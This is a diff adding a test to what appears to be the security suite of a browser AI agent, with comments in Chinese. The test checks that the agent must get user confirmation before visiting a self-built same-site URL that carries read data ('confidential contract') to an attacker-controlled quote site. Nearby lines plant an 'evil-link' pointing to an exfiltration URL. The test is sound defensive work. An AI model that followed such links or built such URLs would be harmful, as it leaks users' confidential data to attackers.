@@ -1048,6 +1048,20 @@ try {
   assert.deepEqual(attackReqs.filter((u) => u !== "/favicon.ico"), ["/?from=user"]);
   await test.goto(`http://127.0.0.1:${PORT}/`);
   attackReqs.length = 0;
+  // 讀過內容之後，使用者訊息裡提到的網站也只有那個完全相同的網址免問：同站其他網址（agent 自己組的，可能帶著讀到的資料）要確認。
+  // 情境：請它比對報價網站，那個網站本身就是攻擊者的
+  const SAME_SITE = `${ATTACK}/quote?c=${"機密合約".repeat(3)}`;
+  await run(`比對這頁跟 ${ATTACK}/ 的報價`, [
+    { type: "tool_use", id: "x2b", name: "read_page", input: {} },
+    { type: "tool_use", id: "x2c", name: "navigate", input: { url: SAME_SITE } },
+  ]);
+  await until(() => waitingCard().count(), "讀過頁面後前往使用者提到的網站、但網址是自己組的：確認卡沒出現");
+  assert.equal(await waitingCard().locator(".confirm-detail").textContent(), SAME_SITE, "卡片顯示完整網址");
+  await waitingCard().locator(".confirm-deny").click();
+  await idle();
+  await panel.waitForTimeout(300);
+  assert.equal(hits(), 0, "拒絕 → 攻擊端 0 請求");
+  assert.equal(test.url(), `http://127.0.0.1:${PORT}/`, "拒絕 → 分頁沒換");
   // 點「看起來無害」但 href 指到別的網站、帶著資料的連結 → 跟 navigate 一樣要問
   await test.evaluate((href) => { const a = document.createElement("a"); a.id = "evil-link"; a.href = href; a.textContent = "Read more"; document.body.append(a); }, EXFIL);
   await run("整理這頁", [{ type: "tool_use", id: "x3", name: "click", input: { selector: "#evil-link" } }]);
